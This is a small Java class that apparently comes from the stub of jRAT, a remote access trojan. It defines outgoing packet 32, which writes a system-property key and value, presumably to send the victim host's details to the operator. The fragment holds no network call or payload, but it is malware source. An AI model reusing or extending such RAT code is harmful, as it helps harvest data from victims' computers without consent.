package su.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import su.jrat.common.io.StringWriter;


public class Packet32SystemProperties extends AbstractOutgoingPacket {

	private String key;
	private String property;

	public Packet32SystemProperties(String key, String property) {
		this.key = key;
		this.property = property;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(key);
		sw.writeLine(property);
	}

	@Override
	public byte getPacketId() {
		return 32;
	}

}
